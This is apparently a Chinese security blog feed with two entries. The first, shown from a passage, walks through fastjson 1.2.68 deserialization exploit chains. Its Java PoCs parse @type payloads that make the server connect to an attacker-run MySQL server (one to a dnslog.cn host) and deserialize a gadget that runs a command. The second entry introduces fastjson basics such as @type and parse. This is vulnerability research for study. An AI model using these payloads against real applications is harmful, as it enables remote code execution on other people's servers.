class="hljs-string">&quot;  \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: &#x27;com.mysql.jdbc.JDBC4Connection&#x27;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;hostToConnectTo\&quot;: \&quot;kx97t6.dnslog.cn\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;portToConnectTo\&quot;: 3306,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;info\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;user\&quot;: \&quot;root\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;password\&quot;: \&quot;root\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;NUM_HOSTS\&quot;: \&quot;1\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;databaseToConnectTo\&quot;: \&quot;lingx5\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;url\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328101945811.png" alt="image-20250328101945811"></p><p>既然可以发送mysql的连接请求，结合Mysql的反序列化的gadget，可以实现命令执行</p><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>我们在研究JNDI的时候 讨论过mysql的反序列化，可以去看 <a href="https://www.cnblogs.com/LINGX5/p/18780870#%E9%BB%98%E8%AE%A4%E5%B7%A5%E5%8E%82%E5%88%A9%E7%94%A8">这部分内容</a></p><p>我们用工具开启一个恶意的mysql服务器</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328102658940.png" alt="image-20250328102658940" style="zoom: 50%;" /><p>生成的POC</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">jdbc:</span>mysql://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>/test?autoDeserialize=true&amp;statementInterceptors=<span class="hljs-keyword">com</span>.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc<br></code></pre></td></tr></table></figure><p>我们把对应的属性添加进去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDBCDeser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;@type\&quot;: &#x27;com.mysql.jdbc.JDBC4Connection&#x27;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;hostToConnectTo\&quot;: \&quot;localhost\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;portToConnectTo\&quot;: 3306,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;info\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;user\&quot;: \&quot;deser_CC31_calc\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;password\&quot;: \&quot;root\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;statementInterceptors\&quot;:&#x27;com.mysql.jdbc.interceptors&quot;</span> +<br>                <span class="hljs-string">&quot;.ServerStatusDiffInterceptor&#x27;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;autoDeserialize\&quot;: \&quot;true\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;NUM_HOSTS\&quot;: \&quot;1\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;databaseToConnectTo\&quot;: \&quot;test\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;  \&quot;url\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328103424127.png" alt="image-20250328103424127"></p><h4 id="LoadBalancedMySQLConnection"><a href="#LoadBalancedMySQLConnection" class="headerlink" title="LoadBalancedMySQLConnection"></a>LoadBalancedMySQLConnection</h4><p>适用版本6.0.2&#x2F;6.0.3</p><p>LoadBalancedMySQLConnection这个类的构造方法只需要一个 url 就可以发送mysql的连接请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">LoadBalancedMySQLConnection</span><span class="hljs-params">(LoadBalancedConnectionProxy proxy)</span> &#123;<br>    <span class="hljs-built_in">super</span>(proxy);<br>&#125;<br></code></pre></td></tr></table></figure><p>LoadBalancedConnectionProxy 在初始化的时候，会去调用 pickNewConnection() 方法，最终调用到 com.mysql.cj.mysqla.MysqlaSession#connect 创建mysql连接</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328122856997.png" alt="image-20250328122856997"></p><p><strong>jdbc6Deser</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.poc;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jdbc6Deser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;       \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;       \&quot;@type\&quot;:\&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;       \&quot;proxy\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;              \&quot;connectionString\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                     \&quot;url\&quot;:\&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_calc\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;              &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;       &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建连接的调用栈</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328123337617.png" alt="image-20250328123337617"></p><p>复制出来 看一下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">connect:<span class="hljs-number">149</span>, MysqlaSession (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.mysqla)<br>connectOneTryOnly:<span class="hljs-number">1803</span>, ConnectionImpl (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.jdbc)<br>createNewIO:<span class="hljs-number">1673</span>, ConnectionImpl (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.jdbc)<br>&lt;init&gt;:<span class="hljs-number">656</span>, ConnectionImpl (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.jdbc)<br>getInstance:<span class="hljs-number">349</span>, ConnectionImpl (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>.jdbc)<br>createConnectionForHost:<span class="hljs-number">329</span>, MultiHostConnectionProxy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br>createConnectionForHost:<span class="hljs-number">374</span>, LoadBalancedConnectionProxy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br>pickConnection:<span class="hljs-number">80</span>, RandomBalanceStrategy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br>pickNewConnection:<span class="hljs-number">318</span>, LoadBalancedConnectionProxy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br>&lt;init&gt;:<span class="hljs-number">227</span>, LoadBalancedConnectionProxy (com<span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>.ha)<br></code></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328123434401.png" alt="image-20250328123434401"></p><h4 id="ReplicationMySQLConnection"><a href="#ReplicationMySQLConnection" class="headerlink" title="ReplicationMySQLConnection"></a>ReplicationMySQLConnection</h4><p>适用版本 8.0.19</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs json"> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>              <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="hljs-punctuation">,</span><br>              <span class="hljs-attr">&quot;connectionUrl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                     <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="hljs-punctuation">,</span><br>                     <span class="hljs-attr">&quot;masters&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><br>                     <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                     <span class="hljs-attr">&quot;slaves&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                     <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                            <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;deser_CC31_calc&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;dbname&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;queryInterceptors&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>                            <span class="hljs-attr">&quot;autoDeserialize&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;true&quot;</span><br>                     <span class="hljs-punctuation">&#125;</span><br>              <span class="hljs-punctuation">&#125;</span><br>       <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250328125244146.png" alt="image-20250328125244146"></p><blockquote><p>这条链能够反序列化的只有8.0.19这一个小版本，因为LoadBalancedConnectionProxy的构造参数略有改变</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://y4er.com/posts/fastjson-bypass-autotype-1268/">fastjson 1.2.68 bypass autotype - Y4er 的博客</a></p><p><a href="https://www.anquanke.com/post/id/232774">浅析 Fastjson1.2.62-1.2.68 反序列化漏洞-安全 KER - 安全资讯平台</a></p><p><a href="https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdo2g">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析 | 长亭百川云</a></p><p><a href="https://blog.csdn.net/weixin_39555624/article/details/117820779">https://blog.csdn.net/weixin_39555624/article/details/117820779</a> （这篇文章主要是 fastjson 的特性）</p><p><a href="https://blog.ninefiger.top/2022/11/11/fastjson%201.2.68%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">fastjson 1.2.68 漏洞分析</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247484866&idx=1&sn=23fb7897f6e54cdf61031a65c602487d">关于 blackhat2021 披露的 fastjson1.2.68 链</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>fastjson反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson反序列化</title>
    <link href="/2025/03/25/fastjson/"/>
    <url>/2025/03/25/fastjson/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="fastjson-反序列化"><a href="#fastjson-反序列化" class="headerlink" title="fastjson 反序列化"></a>fastjson 反序列化</h1><h2 id="简单了解"><a href="#简单了解" class="headerlink" title="简单了解"></a>简单了解</h2><p>fastjson 的 maven 坐标</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>fastjson 是阿里巴巴的开源 JSON 解析库，可以把 json 字符串解析为 java Bean 对象，同样也可以把 java Bean 对象解析为 json 字符串。</p><h3 id="javaBean-对象"><a href="#javaBean-对象" class="headerlink" title="javaBean 对象"></a>javaBean 对象</h3><p>那么什么是 javaBean 对象呢？</p><p>JavaBean 是一种符合特定规范的 Java 类，通俗点的解释就是：</p><ol><li>属性是私有的，且每个属性都应该具有对应的 setter 和 getter 方法</li><li>JavaBean 必须有一个无参数的公共构造方法。<span style="color:#FF0000;"> 如果你要自定义有参构造方法，那必须显示声明无参构造方法 </span></li></ol><p><strong>一个 javaBean 的示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.entry;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">// 无参构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-comment">// 带参数的构造方法（可选）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">// Getter方法</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-comment">// Setter方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-comment">// Getter方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-comment">// Setter方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="toJSONString"><a href="#toJSONString" class="headerlink" title="toJSONString()"></a>toJSONString()</h3><p>com.alibaba.fastjson.JSON#toJSONString(java.lang.Object)方法就是把 javaBean 转换为 json 字符串，这个过程它会去调用 javaBean 对象的所有 getter()方法，来获取属性的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.lingx5.entry.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;lingx5&quot;</span>, <span class="hljs-number">18</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> JSON.toJSONString(person);<br>        System.out.println(json);           <span class="hljs-comment">// &#123;&quot;age&quot;:18,&quot;name&quot;:&quot;lingx5&quot;&#125;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果肯定是显而易见的</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320163435555.png" alt="image-20250320163435555" style="zoom:50%;" /><p>当然，我们在 javaBean 对应个 getter()方法中加入输出，再来看看结果</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320163936056.png" alt="image-20250320163936056" style="zoom:50%;" /><p>我们再次运行 jsonTest</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320164042090.png" alt="image-20250320164042090" style="zoom:50%;" /><p>在默认情况下，Fastjson 将 JavaBean 对象序列化为 JSON 字符串时，<strong>主要依赖于反射机制</strong>，并通过 <strong>内省 (Introspection)</strong> 机制 <strong>查找并调用 JavaBean 对象的 getter 方法</strong> 来获取属性值。</p><h3 id="parse"><a href="#parse" class="headerlink" title="parse()"></a>parse()</h3><p>com.alibaba.fastjson.JSON#parse(java.lang.String)这个方法可以把 JSON 字符串转换为 java 对象，不过 <span style="color:#FF0000;"> 默认情况下会转换为 com.alibaba.fastjson.JSONObject 对象，不会是我们的 javaBean 对象 </span></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">personJson</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;lingx5\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(personJson);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;parse的类型是：&quot;</span>+parse.getClass().getTypeName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320170302517.png" alt="image-20250320170302517" style="zoom:50%;" /><p>我们没有转换为 javaBean 对象，那自然也不会调用 javaBean 的 getter()和 setter()方法</p><p>那怎么转化为 javaBean 对象呢？</p><h3 id="type"><a href="#type" class="headerlink" title="@type"></a>@type</h3><p>在 fastjson1.2.4 中，默认是开启 autoType 属性的。即在 parse()方法执行时，识别到字段 <code>@type</code> 会根据字段的值，利用 javaBean 的无参构造器和 setter()去封装对应的 javaBean 对象。也正是因为这一特性，为 fastjson 反序列化漏洞打开了大门。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">personJson</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.lingx5.entry.Person\&quot;,\&quot;name\&quot;:\&quot;lingx5\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parse(personJson);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;parse的类型是：&quot;</span>+parse.getClass().getTypeName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://gitee.com/ling-x5/img/raw/master/image-20250320175156909.png" alt="image-20250320175156909" style="zoom:50%;" /><p>我们看到在处理@type 字段时，parse()方法会去调用我们指定的类的 setter()方法，封装一个 javaBean 对象出来</p><h3 id="parseObject"><a href="#parseObject" class="headerlink" title="parseObject()"></a>parseObject()</h3><p>其实除了@type 字段可以让 json 字符串转化为我们想要的 javaBean 对象，还可以使用 com.alibaba.fastjson.JSON#parseObject(java.lang.String, java.lang.Class <T>)在第二个参数指定 class，从而实现转换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jsonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">personJson</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;lingx5\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">parse</span> <span class="hljs-operator">=</span> JSON.parseObject(personJson, com.lingx5.entry.Person.class);<br>        System.out.println(parse);<br>        System.out.println(<span class="hljs-string">&quot;parse的类型是：&quot;</span>+parse.getClass().getTypeName());<br>    